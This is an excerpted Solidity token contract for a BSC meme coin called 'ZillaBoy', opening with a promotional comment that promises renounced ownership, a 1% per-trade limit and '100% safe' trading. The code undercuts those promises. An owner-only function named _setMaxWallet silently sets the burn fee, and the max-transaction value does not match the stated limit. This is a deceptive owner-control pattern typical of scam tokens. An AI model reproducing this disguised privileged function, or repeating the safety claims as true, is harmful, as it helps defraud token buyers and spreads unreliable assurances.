...
/**
    ...
    I make this #ZillaBoy to hand over it to the community.
    Create the community by yourself if you are interested.   
    I suggest a telegram group name for you to create: https://t.me/ZillaBoyBSC
   ...
   I will renounce the ownership to burn addresses to transfer #ZillaBoy to the community, make sure it's 100% safe.

   I will add 0.25 BNB and all the left 50% total supply to the pool
   Can you make #ZillaBoy 100000X? 

   1,000,000,000,000,000 total supply
   10,000,000,000,000 (1%) max limit per trade
   ...
   it's the best part of the #ZillaBoy idea, increasing the liquidity pool automatically, 
...
contract ZillaBoy is Context, IERC20, Ownable {
    ...
    string private _name = "ZillaBoy";
    string private _symbol = "ZillaBoy";
    ...
    uint256 public _maxTxAmount = 1 * 10**3 * 10**9;
    ...
    function _setMaxWallet(uint256 setMaxWallet) external onlyOwner() {
        require(setMaxWallet < _taxFee, 'burnFee should be less than taxFee');
        _burnFee = setMaxWallet;
    }
}